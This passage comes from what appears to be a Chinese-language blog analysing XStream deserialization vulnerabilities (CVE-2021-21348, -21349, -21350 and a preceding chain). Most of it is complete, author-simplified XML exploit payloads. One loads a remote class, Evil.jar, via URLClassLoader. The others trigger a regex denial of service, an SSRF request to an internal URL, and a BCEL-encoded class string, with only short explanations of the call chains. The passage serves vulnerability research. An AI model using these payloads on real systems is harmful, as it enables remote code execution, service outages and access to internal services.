class="line">                    &lt;staticPermissions&gt;false&lt;/staticPermissions&gt;</span><br><span class="line">                    &lt;key&gt;</span><br><span class="line">                      &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;/key&gt;</span><br><span class="line">                  &lt;/defaultDomain&gt;</span><br><span class="line">                  &lt;initialized&gt;true&lt;/initialized&gt;</span><br><span class="line">                  &lt;pdcache/&gt;</span><br><span class="line">                &lt;/processorCL&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">              &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">            &lt;in class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">              &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">              &lt;pos&gt;-2147483648&lt;/pos&gt;</span><br><span class="line">              &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">              &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">            &lt;/in&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">          &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">        &lt;transferFlavors/&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">      &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>POC非常长，我又优化了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;&gt;</span><br><span class="line">                &lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">                  &lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">                    &lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">                      &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                  &lt;/outer-class&gt;</span><br><span class="line">                &lt;/names&gt;</span><br><span class="line">                &lt;processorCL class=&#x27;java.net.URLClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;ucp class=&#x27;sun.misc.URLClassPath&#x27;&gt;</span><br><span class="line">                    &lt;urls serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                      &lt;unserializable-parents/&gt;</span><br><span class="line">                      &lt;vector&gt;</span><br><span class="line">                        &lt;default&gt;</span><br><span class="line">                          &lt;elementCount&gt;1&lt;/elementCount&gt;</span><br><span class="line">                          &lt;elementData&gt;</span><br><span class="line">                            &lt;url&gt;http://127.0.0.1:8080/Evil.jar&lt;/url&gt;</span><br><span class="line">                          &lt;/elementData&gt;</span><br><span class="line">                        &lt;/default&gt;</span><br><span class="line">                      &lt;/vector&gt;</span><br><span class="line">                    &lt;/urls&gt;</span><br><span class="line">                    &lt;loaders/&gt;</span><br><span class="line">                    &lt;lmap/&gt;</span><br><span class="line">                  &lt;/ucp&gt;</span><br><span class="line">                  &lt;package2certs class=&#x27;concurrent-hash-map&#x27;/&gt;</span><br><span class="line">                  &lt;classes/&gt;</span><br><span class="line">                  &lt;initialized&gt;true&lt;/initialized&gt;</span><br><span class="line">                  &lt;pdcache/&gt;</span><br><span class="line">                &lt;/processorCL&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>前半部分跟CVE-2020-26217有点相似，入口点由HashMap变成PriorityQueue，之前是由NativeString的toString到的Base64Data的toString，这次由ObservableList$1的compare方法到的Base64Data的toString。</p>
<p>有个细节，xml的这部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">	&lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">		&lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">			&lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">		&lt;/a&gt;</span><br><span class="line">	&lt;/outer-class&gt;</span><br><span class="line">&lt;/names&gt;</span><br></pre></td></tr></table></figure>

<p>声明了names属性为Itr迭代器，同时往外部类（AbstractList）存入了一个字符串数组（之前说过，翻看CVE-2020-26217）。</p>
<p>调用链如下：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101837525.png" alt="image-20230410183729415"></p>
<p>在get方法中，调用了close方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101837011.png" alt="image-20230410183707902"></p>
<p>close方法又调用了nextStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101838788.png" alt="image-20230410183804688"></p>
<p>nextStream方法中调用e属性（MultiUIDefaults$MultiUIDefaultsEnumerator）的hasMoreElements方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101838498.png" alt="image-20230410183835413"></p>
<p>接着是 iterator属性（JavacProcessingEnvironment$NameProcessIterator）的hasNext方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101839704.png" alt="image-20230410183936633"></p>
<p>在JavacProcessingEnvironment$NameProcessIterator的hasNext方法中使用URLClassLoader加载远程类并实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101840604.png" alt="image-20230410184037509"></p>
<h2 id="CVE-2021-21348"><a href="#CVE-2021-21348" class="headerlink" title="CVE-2021-21348"></a>CVE-2021-21348</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会造成正则回朔拒绝服务，当使用重复运算符嵌套时，例如<code>(x+)*y</code>模式，去匹配10个字符的x，先匹配括号里的x（加号代表一个或者多个）再匹配括号外的x（<code>*</code>代表零个或多个），在此期间CPU会不断的回溯匹配，最终会计算17945次而结束匹配，这种正则模式由于会造成CPU的大量计算，而导致拒绝服务漏洞。</p>
<p>官方的POC我又进行了简化，简化后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;java.util.Scanner&#x27;&gt;</span><br><span class="line">                &lt;buf class=&#x27;java.nio.HeapCharBuffer&#x27;&gt;</span><br><span class="line">                  &lt;capacity&gt;1024&lt;/capacity&gt;</span><br><span class="line">                  &lt;hb&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/hb&gt;</span><br><span class="line">                &lt;/buf&gt;</span><br><span class="line">                &lt;matcher&gt;</span><br><span class="line">                  &lt;text class=&#x27;java.nio.HeapCharBuffer&#x27; reference=&#x27;../../buf&#x27;/&gt;</span><br><span class="line">                &lt;/matcher&gt;</span><br><span class="line">                &lt;delimPattern&gt;</span><br><span class="line">                  &lt;pattern&gt;(x+)*y&lt;/pattern&gt;</span><br><span class="line">                  &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">                &lt;/delimPattern&gt;</span><br><span class="line">                &lt;source class=&#x27;java.io.StringReader&#x27;&gt;</span><br><span class="line">                  &lt;lock class=&#x27;java.io.StringReader&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">                  &lt;str&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/str&gt;</span><br><span class="line">                  &lt;length&gt;32&lt;/length&gt;</span><br><span class="line">                &lt;/source&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>会将source标签里的str标签控制的字符串写入HeapCharBuffer，length标签控制写入长度。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.hasMoreElements(MultiUIDefaults.java:148)</span><br><span class="line">java.io.SequenceInputStream.nextStream(SequenceInputStream.java:109)</span><br><span class="line">java.io.SequenceInputStream.close(SequenceInputStream.java:232)</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get(Base64Data.java:183)</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString(Base64Data.java:286)</span><br><span class="line">javafx.collections.ObservableList$1.compare(ObservableList.java:153)</span><br><span class="line">java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)</span><br><span class="line">java.util.PriorityQueue.siftDown(PriorityQueue.java:687)</span><br><span class="line">java.util.PriorityQueue.heapify(PriorityQueue.java:736)</span><br><span class="line">java.util.PriorityQueue.readObject(PriorityQueue.java:796)</span><br></pre></td></tr></table></figure>

<p>从<code>&lt;iterator class=&#39;java.util.Scanner&#39;&gt;</code>开始往下是跟之前利用链所不同的地方，我们直接从不同之处看起：MultiUIDefaultsEnumerator.hasMoreElements()（这之前的调用链如上）</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111134987.png" alt="image-20230411113444924"></p>
<p>在hasNext方法中，进入第二次循环的hasTokenInBuffer方法中（在第一次循环中，进入的hasTokenInBuffer方法会由于HeapCharBuffer的limit属性为0，导致不匹配文本，然后进入readInput方法，从StringReader中读取32个字符x，设置limit为32，然后到第二次循环才会匹配文本）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111138912.png" alt="image-20230411113807848"></p>
<p>在hasTokenInBuffer方法中，设置正则模式，然后调用lookingAt方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111138123.png" alt="image-20230411113837044"></p>
<p>在lookingAt方法调用match，该方法跟matches相似，是用来匹配字符串的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111142008.png" alt="image-20230411114240939"></p>
<p>在match方法中，使用<code>(x+)*y</code>去匹配32个字符的x，造成ReDos：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111144334.png" alt="image-20230411114424236"></p>
<p>我又改造了下POC，设置limit为32，这样就直接在第一次循环的hasTokenInBuffer方法中触发DOS：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;java.util.Scanner&#x27;&gt;</span><br><span class="line">                &lt;buf class=&#x27;java.nio.HeapCharBuffer&#x27;&gt;</span><br><span class="line">                  &lt;capacity&gt;1024&lt;/capacity&gt;</span><br><span class="line">                  &lt;hb&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/hb&gt;</span><br><span class="line">                  &lt;limit&gt;32&lt;/limit&gt;                &lt;/buf&gt;</span><br><span class="line">                &lt;matcher&gt;</span><br><span class="line">                  &lt;text class=&#x27;java.nio.HeapCharBuffer&#x27; reference=&#x27;../../buf&#x27;/&gt;</span><br><span class="line">                &lt;/matcher&gt;</span><br><span class="line">                &lt;delimPattern&gt;</span><br><span class="line">                  &lt;pattern&gt;(x+)*y&lt;/pattern&gt;</span><br><span class="line">                  &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">                &lt;/delimPattern&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2021-21349"><a href="#CVE-2021-21349" class="headerlink" title="CVE-2021-21349"></a>CVE-2021-21349</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会造成SSRF，经简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator&#x27;&gt;</span><br><span class="line">                &lt;configs class=&#x27;sun.misc.FIFOQueueEnumerator&#x27;&gt;</span><br><span class="line">                  &lt;queue&gt;</span><br><span class="line">                    &lt;length&gt;1&lt;/length&gt;</span><br><span class="line">                    &lt;head&gt;</span><br><span class="line">                      &lt;obj class=&#x27;url&#x27;&gt;http://localhost:8080/internal/&lt;/obj&gt;</span><br><span class="line">                    &lt;/head&gt;</span><br><span class="line">                  &lt;/queue&gt;</span><br><span class="line">                  &lt;cursor reference=&#x27;../queue/head&#x27;/&gt;</span><br><span class="line">                &lt;/configs&gt;</span><br><span class="line">                &lt;returned class=&#x27;sorted-set&#x27;/&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">              &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>上半部分跟21348一模一样，同样也是从MultiUIDefaultsEnumerator.hasMoreElements()（这之前的调用链如上）看起：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111435049.png" alt="image-20230411143523946"></p>
<p>在hasNext方法中，取出configs属性的下一个元素，然后调用ServiceFinder的parse方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111436681.png" alt="image-20230411143625595"></p>
<p>在parse方法中，直接发起URL请求：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111437026.png" alt="image-20230411143725935"></p>
<h2 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>官方POC为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;&gt;</span><br><span class="line">                &lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">                  &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                  &lt;lastRet&gt;-1&lt;/lastRet&gt;</span><br><span class="line">                  &lt;expectedModCount&gt;0&lt;/expectedModCount&gt;</span><br><span class="line">                  &lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">                    &lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">                      &lt;string&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A&lt;/string&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                  &lt;/outer-class&gt;</span><br><span class="line">                &lt;/names&gt;</span><br><span class="line">                &lt;processorCL class=&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;parent class=&#x27;sun.misc.Launcher$ExtClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;/parent&gt;</span><br><span class="line">                  &lt;package2certs 